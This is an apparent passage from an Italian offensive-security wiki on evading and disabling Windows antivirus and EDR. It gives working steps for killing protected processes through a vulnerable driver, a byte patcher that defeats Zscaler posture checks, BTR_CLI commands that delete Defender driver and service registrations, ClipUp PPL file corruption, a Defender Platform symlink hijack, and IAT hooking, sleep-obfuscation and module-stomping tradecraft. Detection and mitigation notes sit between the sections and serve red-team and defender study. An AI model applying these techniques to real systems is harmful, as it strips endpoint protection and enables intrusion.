       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Perché funziona**: BYOVD aggira completamente le protezioni in modalità utente; il codice eseguito nel kernel può aprire processi *protetti*, terminarli o manomettere oggetti del kernel, indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
• Abilitare l’elenco di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`), così Windows rifiuta di caricare `AToolsKrnl64.sys`.
• Monitorare la creazione di nuovi servizi *kernel* e generare un avviso quando un driver viene caricato da una directory scrivibile da tutti o non presente nell’elenco consentiti.
• Monitorare gli handle in modalità utente agli oggetti dispositivo personalizzati, seguiti da chiamate `DeviceIoControl` sospette.

### Aggirare i controlli di postura di Zscaler Client Connector tramite patch binarie su disco

**Client Connector** di Zscaler applica localmente le regole di postura del dispositivo e si affida a Windows RPC per comunicare i risultati agli altri componenti. Due scelte progettuali deboli rendono possibile un aggiramento completo:

1. La valutazione della postura avviene **interamente lato client** (viene inviato al server un valore booleano).
2. Gli endpoint RPC interni verificano solo che l’eseguibile che si connette sia **firmato da Zscaler** (tramite `WinVerifyTrust`).<sup>[[11]](#references)</sup>

**Applicando patch a quattro binari firmati su disco**, è possibile neutralizzare entrambi i meccanismi:

| Binario | Logica originale modificata | Risultato |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Restituisce sempre `1`, quindi tutti i controlli risultano conformi |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | Sostituita con NOP ⇒ qualsiasi processo, anche non firmato, può connettersi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita da `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità del tunnel | Saltati |

Estratto minimo del patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Dopo aver sostituito i file originali e riavviato lo stack dei servizi:

* **Tutti** i controlli di postura risultano **verdi/conformi**.
* I binari non firmati o modificati possono aprire gli endpoint RPC named pipe (ad es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy Zscaler.

Questo caso di studio dimostra come le decisioni di trust prese esclusivamente lato client e i semplici controlli delle firme possano essere aggirati con poche patch ai byte.

## Abuso delle funzionalità attendibili di Microsoft Defender `BTR.sys`

Il driver **Boot-Time Removal** di Defender è un utile termine di paragone rispetto al classico BYOVD. `BTR.sys` è un componente di remediation legittimo, firmato da Microsoft, privo di bug di memory corruption e di interfaccia IOCTL; dopo aver ottenuto l'accesso amministrativo e `SeLoadDriverPrivilege`, un operatore può invece falsificare la transazione privata di remediation e ottenere le operazioni previste su file/registro in Ring-0. Si tratta di una **primitiva di neutralizzazione di AV/EDR post-compromissione, non di accesso iniziale o escalation dei privilegi**; inoltre, il driver può essere estratto dalla risorsa `BOOTTIMETOOL` di `MpEngine.dll` dello stesso target, invece di importare un vistoso driver di terze parti.<sup>[[36]](#references)</sup>

### Preparazione del driver monouso

Di norma, Defender salva la risorsa con un nome casuale `[a-z]{8}.sys` e registra un servizio kernel con un nome simile. `DriverEntry` legge il valore `Args` del servizio, apre l'ADS NTFS indicato, decritta e convalida l'elenco delle azioni, scrive i feedback e, dopo aver eseguito correttamente le operazioni, restituisce `0xC0000056` (`STATUS_DELETE_PENDING`), così che il driver venga scaricato invece di rimanere residente. Un servizio contraffatto presenta i seguenti valori caratteristici.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

Lo stream `:changelist` contiene un blob cifrato con RC4. Le build analizzate riutilizzano una chiave fissa di 256 byte, quindi la cifratura non costituisce un confine di autorizzazione. Un plaintext valido ha un header globale di 24 byte (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC dell’header e un ID di transazione derivato dal payload), seguito da un percorso di feedback UTF-16 con terminazione null e da un numero qualsiasi di elementi. Ogni elemento ha un header di 16 byte (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) più dati specifici dell’azione, che terminano con **esattamente quattro byte NUL**. Ogni regione di header/dati viene verificata singolarmente con CRC-32, polinomio `0xEDB88320`, stato iniziale `0xFFFFFFFF` e **senza XOR finale** (`~CRC32`); lo stato CRC viene reimpostato per ogni regione.<sup>[[36]](#references)[[37]](#references)</sup>

Gli ID delle azioni accettate espongono queste primitive del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Dati dell’elemento | Risultato |
| --- | --- | --- |
| 1 | `[percorso UTF-16]` | Elimina un file, anche se bloccato |
| 2 | `[percorso UTF-16]` | Rimuove una directory vuota |
| 3 | `[Flags][origine][destinazione]` | Sposta un file in un percorso protetto scelto dall’attaccante; una destinazione vuota equivale all’eliminazione |
| 4 | `[Flags][percorso della chiave]` | Elimina ricorsivamente una chiave del registro |
| 5 | `[Flags][percorso della chiave + "\\" + valore]` | Elimina un valore del registro |
| 6 | `[Flags][tipo][dimensione][percorso della chiave + "\\" + valore][dati]` | Crea/aggiorna un valore del registro e crea i percorsi delle chiavi mancanti |

Per le azioni 5 e 6, il separatore chiave/valore sul wire è composto da **due backslash consecutivi**; un percorso formattato secondo le convenzioni non verrà suddiviso correttamente. Il file di feedback rispecchia in gran parte la richiesta, ma i primi quattro byte di dati di ogni elemento diventano il relativo `NTSTATUS`. Per le azioni 1 e 2, che non hanno un campo flags iniziale, BTR sposta il percorso nei quattro byte riservati finali per fare spazio a quello status.<sup>[[36]](#references)</sup>

### Workflow di `BTR_CLI` e finestra di avvio anticipato

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa l’intera catena: estrae `BTR.sys` da Defender locale, crea `<random>.sys:changelist` e uno stream di feedback, serializza/calcola i checksum/cifra le azioni concatenandole, crea direttamente la chiave del registro del servizio, quindi chiama `NtLoadDriver` per `-trigger now` oppure lascia il driver come driver ad avvio del sistema per `-trigger boot`. La preparazione diretta nel registro evita il normale percorso SCM `CreateServiceW` e quindi **non genera l’Event ID 7045 di installazione del servizio**. Gli artefatti attivati all’avvio possono essere rimossi in seguito con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` non è utilizzabile perché BTR esegue operazioni di I/O sui file da `DriverEntry`, prima che lo stack di archiviazione e il collegamento `SystemRoot` siano pronti. `Start=1` insieme al gruppo ad alta priorità `Boot Bus Extender` consente invece l'esecuzione nella Fase 1: NTFS è utilizzabile, ma molti driver di sicurezza ad avvio del sistema e servizi EDR in modalità utente non sono ancora inizializzati. I filtri ad avvio del sistema come `WdFilter` potrebbero essere già caricati, ma BTR può rimuoverne i file binari o la configurazione del servizio prima dell'avvio successivo e può eliminare gli eseguibili dei servizi prima che SCM li avvii. ELAM non colma questa lacuna perché BTR viene eseguito dopo la valutazione dei driver di avvio e ha una firma Microsoft valida.<sup>[[36]](#references)</sup>

Più azioni vengono eseguite in un'unica transazione. Il PoC antepone l'Azione 1 per il percorso hardcoded `\SystemRoot\Temp\BootClean.log`: BTR crea questo log, poi esegue la propria richiesta di eliminazione e lo rimuove prima di scaricarsi. Questo riduce le prove, mentre collocare il feedback in `<random>.sys:<random>.dat` consente di rimuovere insieme il driver e i due flussi.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlazioni ad alto segnale

Le regole basate solo sulla firma e la blocklist Microsoft dei driver vulnerabili non contrastano l'abuso delle funzionalità previste di BTR. Preferisci queste correlazioni comportamentali, distinguendo al contempo la legittima provenienza da Defender da un launcher arbitrario.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creazione di `.sys:changelist` è tipica di ogni fase di staging di BTR. Un ADS `.dat` associato allo stesso `.sys` è particolarmente sospetto, perché Defender normalmente colloca il feedback in `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 senza System 7045:** correla la creazione diretta di `HKLM\SYSTEM\CurrentControlSet\Services\<random>` contenente `Args=...:changelist` e `Group=Boot Bus Extender` all'assenza di un corrispondente evento di installazione SCM.
- **Sysmon 6 -> 23:** correla il caricamento di un driver BTR noto da una provenienza non Defender con la successiva eliminazione di file attribuita a `System`/PID 4, in particolare se riguarda file binari di sicurezza.
- **Sysmon 11 -> 23:** genera un avviso in caso di rapida creazione ed eliminazione di `\SystemRoot\Temp\BootClean.log` da parte di `System`/PID 4.
- Limita e monitora l'assegnazione/l'abilitazione di `SeLoadDriverPrivilege`; una firma Microsoft da sola non è sufficiente a garantire l'affidabilità quando un driver di uno strumento di sicurezza viene sottoposto a staging da `cmd.exe`, PowerShell o un processo sconosciuto.

## Abusare di Protected Process Light (PPL) per manomettere AV/EDR con LOLBIN

Protected Process Light (PPL) applica una gerarchia di firmatari/livelli, in modo che solo i processi protetti con livello pari o superiore possano manomettersi a vicenda. Dal punto di vista offensivo, se puoi avviare legittimamente un binario abilitato a PPL e controllarne gli argomenti, puoi trasformare una funzionalità innocua (ad es. la registrazione) in una primitiva di scrittura vincolata, supportata da PPL, contro le directory protette utilizzate da AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Cosa serve perché un processo venga eseguito come PPL
- L'EXE di destinazione (e tutte le DLL caricate) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un livello di protezione compatibile con il firmatario del binario (ad es. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per i firmatari anti-malware, `PROTECTION_LEVEL_WINDOWS` per i firmatari Windows). Livelli errati impediscono la creazione.

Vedi anche una panoramica più ampia di PP/PPL e della protezione di LSASS qui:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Strumenti launcher
- Helper open source: CreateProcessAsPPL (seleziona il livello di protezione e inoltra gli argomenti all'EXE di destinazione):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Schema di utilizzo:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si avvia autonomamente e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Se avviato come processo PPL, la scrittura del file avviene con protezione PPL.
- ClipUp non riesce a interpretare i percorsi contenenti spazi; usa percorsi brevi 8.3 per raggiungere posizioni normalmente protette.

Helper per i percorsi brevi 8.3
- Elenca i nomi brevi: esegui `dir /x` in ciascuna directory principale.
- Ricava il percorso breve in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Catena di abuso (astratta)
1) Avvia il LOLBIN compatibile con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (ad es., CreateProcessAsPPL).
2) Passa a ClipUp l'argomento per il percorso del log, così da forzare la creazione di un file in una directory AV protetta (ad es., Defender Platform). Se necessario, usa nomi brevi 8.3.
3) Se il binario di destinazione è normalmente aperto/bloccato dall'AV mentre è in esecuzione (ad es., MsMpEng.exe), pianifica la scrittura all'avvio, prima che si avvii l'AV, installando un servizio ad avvio automatico che parta sicuramente prima. Verifica l'ordine di avvio con Process Monitor (boot logging).
4) Al riavvio, la scrittura con protezione PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file di destinazione e impedendone l'avvio.

Esempio di invocazione (percorsi oscurati/abbreviati per sicurezza):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Note e vincoli
- Non puoi controllare il contenuto scritto da ClipUp, ma solo la posizione; questa primitiva è adatta alla corruzione, non all'iniezione precisa di contenuti.
- Sono necessari privilegi di amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di riavvio.
- Il tempismo è fondamentale: il file di destinazione non deve essere aperto; l'esecuzione all'avvio evita i blocchi dei file.

Rilevamenti
- Creazione di processi `ClipUp.exe` con argomenti insoliti, soprattutto se avviati da launcher non standard, durante l'avvio.
- Nuovi servizi configurati per avviare automaticamente binari sospetti e che si avviano sistematicamente prima di Defender/AV. Analizza la creazione/modifica dei servizi prima degli errori di avvio di Defender.
- Monitoraggio dell'integrità dei file dei binari/delle directory Platform di Defender; creazioni/modifiche inaspettate da parte di processi con flag di protected-process.
- Telemetria ETW/EDR: cerca processi creati con `CREATE_PROTECTED_PROCESS` e un uso anomalo dei livelli PPL da parte di binari non AV.

Mitigazioni
- WDAC/Code Integrity: limita quali binari firmati possono essere eseguiti come PPL e da quali processi padre; blocca l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Igiene dei servizi: limita la creazione/modifica dei servizi ad avvio automatico e monitora la manipolazione dell'ordine di avvio.
- Assicurati che la protezione antimanomissione di Defender e le protezioni early-launch siano abilitate; analizza gli errori di avvio che indicano la corruzione dei binari.
- Valuta di disabilitare la generazione di nomi brevi 8.3 sui volumi che ospitano gli strumenti di sicurezza, se compatibile con il tuo ambiente (esegui test approfonditi).

## Manomissione di Microsoft Defender tramite hijack di symlink della cartella Platform

Windows Defender sceglie la piattaforma da cui viene eseguito enumerando le sottocartelle in:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sottocartella con la stringa di versione in ordine lessicografico più alta (ad es., `4.18.25070.5-0`), quindi avvia da lì i processi del servizio Defender (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione si basa sulle voci delle directory, inclusi i reparse point di directory (symlink). Un amministratore può sfruttare questo comportamento per reindirizzare Defender verso un percorso scrivibile da un attacker e ottenere DLL sideloading o interrompere il servizio.<sup>[[21]](#references)[[22]](#references)</sup>

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink nella cartella Platform)
- Possibilità di riavviare o attivare una nuova selezione della piattaforma Defender (riavvio del servizio all'avvio)
- Sono sufficienti strumenti integrati (mklink)

Perché funziona
- Defender impedisce le scritture nelle proprie cartelle, ma la selezione della piattaforma si basa sulle voci delle directory e sceglie la versione in ordine lessicografico più alta senza verificare che la destinazione corrisponda a un percorso protetto/attendibile.

Passo per passo (esempio)
1) Prepara una copia scrivibile della cartella della piattaforma corrente, ad es., `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con una versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verifica che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo in `C:\TMP\AV\` e la configurazione del servizio/registro che riflette quella posizione.

Opzioni post-exploitation
- DLL sideloading/code execution: rilascia/sostituisci DLL che Defender carica dalla propria directory applicativa per eseguire codice nei processi di Defender. Vedi la sezione precedente: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: rimuovi il symlink della versione, in modo che al successivo avvio il percorso configurato non venga risolto e Defender non si avvii:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Nota che questa tecnica non consente di per sé l'escalation dei privilegi; richiede diritti di amministratore.

## API/IAT Hooking + Call-Stack Spoofing with PIC (stile Crystal Kit)

I Red team possono spostare l'evasione runtime dall'impianto C2 al modulo target, applicando hooking alla sua Import Address Table (IAT) e instradando API selezionate tramite codice position-independent (PIC) controllato dall'attaccante. Questo generalizza l'evasione oltre la ridotta superficie API esposta da molti kit (ad es., CreateProcessA) ed estende le stesse protezioni a BOF e DLL di post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Approccio generale
- Eseguire lo staging di un blob PIC accanto al modulo target usando un reflective loader (anteposto o complementare). Il PIC deve essere autonomo e position-independent.
- Durante il caricamento della DLL host, scorrere il suo IMAGE_IMPORT_DESCRIPTOR e modificare le voci IAT degli import selezionati (ad es., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) affinché puntino a wrapper PIC essenziali.
- Ogni wrapper PIC esegue le tecniche di evasione prima di effettuare una tail-call all'indirizzo dell'API reale. Le tecniche di evasione tipiche includono:
  - Mascheramento/smascheramento della memoria prima e dopo la chiamata (ad es., cifrare le regioni del beacon, passare da RWX a RX, modificare i nomi/le autorizzazioni delle pagine) e quindi ripristinarla dopo la chiamata.
  - Call-stack spoofing: costruire uno stack legittimo e passare all'API target in modo che l'analisi del call stack risolva i frame previsti.<sup>[[9]](#references)</sup>
- Per garantire la compatibilità, esportare un'interfaccia che consenta a uno script Aggressor (o equivalente) di registrare le API da sottoporre a hooking per Beacon, BOF e DLL di post-exploitation.

Perché usare IAT hooking in questo caso
- Funziona con qualsiasi codice che utilizza l'import sottoposto a hooking, senza modificare il codice degli strumenti né affidarsi a Beacon per fare da proxy a API specifiche.
- Copre le DLL di post-exploitation: applicare hooking a LoadLibrary* consente di intercettare i caricamenti dei moduli (ad es., System.Management.Automation.dll, clr.dll) e applicare alle relative chiamate API le stesse tecniche di mascheramento/evasione dello stack.
- Ripristina l'uso affidabile dei comandi di post-exploitation che generano processi, contro i rilevamenti basati sul call stack, tramite wrapper per CreateProcessA/W.

Schema minimo di IAT hooking (pseudocodice x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Applica la patch dopo le relocazioni/ASLR e prima del primo uso dell'import. Loader reflective come TitanLdr/AceLdr dimostrano l'hooking durante il DllMain del modulo caricato.
- Mantieni i wrapper minuscoli e sicuri per PIC; risolvi la vera API tramite il valore IAT originale acquisito prima della patch oppure tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine scrivibili ed eseguibili.

Stub di call-stack spoofing
- Gli stub PIC in stile Draugr costruiscono una catena di chiamate fittizia (indirizzi di ritorno in moduli innocui) e poi passano alla vera API.
- Questo aggira i rilevamenti che si aspettano stack canonici da Beacon/BOF per le API sensibili.
- Combinali con tecniche di stack cutting/stack stitching per arrivare ai frame previsti prima del prologo dell'API.

Integrazione operativa
- Anteponi il loader reflective alle DLL post-ex, in modo che PIC e hook si inizializzino automaticamente al caricamento della DLL.
- Usa uno script Aggressor per registrare le API target, così Beacon e BOF beneficiano in modo trasparente dello stesso percorso di evasione, senza modifiche al codice.

Considerazioni di rilevamento/DFIR
- Integrità IAT: voci che risolvono in indirizzi non-image (heap/anonimi); verifica periodica dei puntatori agli import.
- Anomalie dello stack: indirizzi di ritorno che non appartengono a immagini caricate; transizioni improvvise a PIC non-image; genealogia incoerente di RtlUserThreadStart.
- Telemetria del loader: scritture in-process nella IAT, attività precoce di DllMain che modifica gli import thunk, regioni RX inattese create al caricamento.
- Evasione del caricamento delle immagini: se si intercetta LoadLibrary*, monitorare i caricamenti sospetti di assembly automation/clr correlati a eventi di memory masking.

Componenti ed esempi correlati
- Loader reflective che eseguono IAT patching durante il caricamento (ad es., TitanLdr, AceLdr)
- Hook di memory masking (ad es., simplehook) e PIC per stack cutting (stackcutting)
- Stub PIC di call-stack spoofing (ad es., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Hook IAT import-time tramite un PICO residente

Se controlli un loader reflective, puoi eseguire l'hooking degli import **durante** `ProcessImports()` sostituendo il puntatore `GetProcAddress` del loader con un resolver personalizzato che controlla prima gli hook:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crea un **PICO residente** (oggetto PIC persistente) che sopravviva dopo che il PIC transitorio del loader si è liberato.
- Esporta una funzione `setup_hooks()` che sovrascriva il resolver degli import del loader (ad es., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, ignora gli import ordinali e usa una ricerca degli hook basata su hash, come `__resolve_hook(ror13hash(name))`. Se esiste un hook, restituiscilo; altrimenti delega al vero `GetProcAddress`.
- Registra i target degli hook al momento del linking con le voci Crystal Palace `addhook "MODULE$Func" "hook"`. L'hook resta valido perché risiede nel PICO residente.

Questo consente **il reindirizzamento IAT import-time** senza patchare la sezione di codice della DLL caricata dopo il caricamento.

### Forzare gli import intercettabili quando il target usa il PEB-walking

Gli hook import-time si attivano solo se la funzione è effettivamente nella IAT del target. Se un modulo risolve le API tramite PEB-walk + hash (senza voce di import), forza un import reale, in modo che il percorso `ProcessImports()` del loader possa rilevarlo:

- Sostituisci la risoluzione degli export basata su hash (ad es., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con un riferimento diretto come `&WaitForSingleObject`.
- Il compilatore genera una voce IAT, consentendo l'intercettazione quando il loader reflective risolve gli import.

### Offuscamento del sonno/dell'inattività in stile Ekko senza patchare `Sleep()`

Invece di patchare `Sleep`, intercetta le **primitive effettive di attesa/IPC** usate dall'impianto (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Per le attese lunghe, avvolgi la chiamata in una catena di offuscamento in stile Ekko che cifra l'immagine in memoria durante l'inattività:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` per pianificare una sequenza di callback che chiamano `NtContinue` con frame `CONTEXT` predisposti.
- Catena tipica (x64): imposta l'immagine su `PAGE_READWRITE` → cifra con RC4 tramite `advapi32!SystemFunction032` l'intera immagine mappata → esegui l'attesa bloccante → decifra con RC4 → **ripristina i permessi per sezione** scorrendo le sezioni PE → segnala il completamento.
- `RtlCaptureContext` fornisce un `CONTEXT` modello; clonalo in più frame e imposta i registri (`Rip/Rcx/Rdx/R8/R9`) per eseguire ogni passaggio.

Dettaglio operativo: restituisci “successo” per le attese lunghe (ad es., `WAIT_OBJECT_0`), così il chiamante prosegue mentre l'immagine è mascherata. Questo schema nasconde il modulo agli scanner durante le finestre di inattività ed evita la classica firma di `Sleep()` “patchato”.

Idee di rilevamento (basate sulla telemetria)
- Raffiche di callback `CreateTimerQueueTimer` che puntano a `NtContinue`.
- `advapi32!SystemFunction032` usato su buffer contigui di grandi dimensioni, pari a un'immagine.
- `VirtualProtect` applicato a un intervallo ampio, seguito dal ripristino personalizzato dei permessi per sezione.

### Registrazione CFG runtime per i gadget di sleep-obfuscation

Nei target con CFG abilitato, il primo salto indiretto verso un gadget a metà funzione, come `jmp [rbx]` o `jmp rdi`, di solito causa il crash del processo con `STATUS_STACK_BUFFER_OVERRUN`, perché il gadget non è presente nei metadati CFG del modulo. Per mantenere attive le catene in stile Ekko/Kraken nei processi hardened:<sup>[[30]](#references)</sup>

- Registra ogni destinazione indiretta usata dalla catena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` e voci `CFG_CALL_TARGET_VALID`.
- Per gli indirizzi all'interno di immagini caricate (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` deve iniziare dalla **base dell'immagine** e coprire **l'intera dimensione dell'immagine**.
- Per regioni mappate manualmente/PIC/stomped, usa invece la **base dell'allocazione** e la dimensione dell'allocazione.
- Contrassegna non solo il gadget di dispatch, ma anche gli export raggiunti indirettamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscall di attesa/evento) e qualsiasi sezione eseguibile controllata dall'attaccante che diventerà una destinazione indiretta.

Questo trasforma le catene di sleep in stile ROP/JOP da primitive che "funzionano solo nei processi senza CFG" a primitive riutilizzabili per `explorer.exe`, browser, `svchost.exe` e altri endpoint compilati con `/guard:cf`.

### Stack spoofing compatibile con CET per i thread in attesa

La sostituzione completa di `CONTEXT` è rumorosa e può causare problemi sui sistemi CET Shadow Stack, perché un `Rip` contraffatto deve comunque corrispondere allo shadow stack hardware. Uno schema più sicuro per il sleep-masking è:<sup>[[30]](#references)</sup>

- Scegli un altro thread dello stesso processo e leggi i limiti dello stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) tramite `NtQueryInformationThread`.
- Esegui il backup del TEB/TIB reale del thread corrente.
- Acquisisci il contesto reale del thread in attesa con `GetThreadContext`.
- Copia **solo** il `Rip` reale nel contesto contraffatto, lasciando invariati lo `Rsp` contraffatto e lo stato dello stack.
- Durante la finestra di attesa, copia l'`NT_TIB` del thread contraffatto nel TEB corrente, in modo che gli stack walker risalgano all'interno di un intervallo di stack legittimo.
- Al termine dell'attesa, ripristina il TIB originale e il contesto del thread.

Questo mantiene un puntatore alle istruzioni coerente con CET, inducendo però in errore gli stack walker EDR che si affidano ai metadati dello stack TEB per convalidare l'unwinding.

### Alternativa basata su APC: Kraken Mask

Se il dispatch tramite timer queue è troppo riconoscibile, la stessa sequenza di sleep-encrypt-spoof-restore può essere eseguita da un thread helper sospeso tramite APC accodate:<sup>[[27]](#references)</sup>

- Crea un thread helper con `NtTestAlert` come entrypoint.
- Accoda frame `CONTEXT`/APC predisposti con `NtQueueApcThread` e svuotali con `NtAlertResumeThread`.
- Memorizza lo stato della catena nell'heap invece che nello stack helper, per evitare di esaurire lo stack predefinito del thread da 64 KB.
- Usa `NtSignalAndWaitForSingleObject` per segnalare atomicamente l'evento di avvio e bloccare il thread.
- Sospendi il thread principale prima di ripristinare il TIB/contesto (`NtSuspendThread` → ripristino → `NtResumeThread`) per ridurre la finestra di race in cui uno scanner potrebbe rilevare uno stack ripristinato solo parzialmente.

In questo modo la firma `CreateTimerQueueTimer` + `NtContinue` viene sostituita da una firma thread helper/APC, mantenendo gli stessi obiettivi di mascheramento RC4 e stack spoofing.

Altre idee di rilevamento
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco prima di sleep, attese o dispatch APC.
- `GetThreadContext`/`SetThreadContext` usati attorno a `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguito da scritture dirette nei limiti dello stack TEB/TIB del thread corrente.
- Catene `NtQueueApcThread`/`NtAlertResumeThread` che raggiungono indirettamente `SystemFunction032`, `VirtualProtect` o helper per il ripristino dei permessi delle sezioni.
- Uso ripetuto di brevi firme gadget come `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) come pivot di dispatch all'interno di moduli firmati.


## Precision Module Stomping

Il module stomping esegue i payload dalla **sezione `.text` di una DLL già mappata nel processo target**, invece di allocare memoria eseguibile privata facilmente riconoscibile o caricare una nuova DLL sacrificale. La destinazione della sovrascrittura dovrebbe essere un'**immagine caricata e supportata da file su disco**, il cui spazio di codice possa contenere il payload senza corrompere i percorsi di codice ancora necessari al processo.<sup>[[1]](#references)[[2]](#references)</sup>

### Selezione affidabile del target

Il module stomping ingenuo su moduli comuni come `uxtheme.dll` o `comctl32.dll` è fragile: la DLL potrebbe non essere caricata nel processo remoto e una regione di codice troppo piccola può causare il crash del processo. Un flusso di lavoro più affidabile è:

1. Enumera i moduli del processo target e conserva un **elenco include di soli nomi** delle DLL già caricate.
2. Crea prima il payload e annotane la **dimensione esatta in byte**.
3. Esamina le DLL candidate su disco e confronta `Misc_VirtualSize` della sezione PE **`.text`** con la dimensione del payload. Questo è più importante della dimensione del file, perché riflette la dimensione della sezione eseguibile **quando è mappata in memoria**.
4. Analizza la **Export Address Table (EAT)** e scegli l'RVA di una funzione esportata come offset iniziale per lo stomp.
5. Calcola il **raggio d'impatto**: se il payload supera i limiti della funzione selezionata, sovrascriverà gli export adiacenti disposti dopo di essa in memoria.

Helper di ricognizione/selezione tipici osservati sul campo:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Note operative
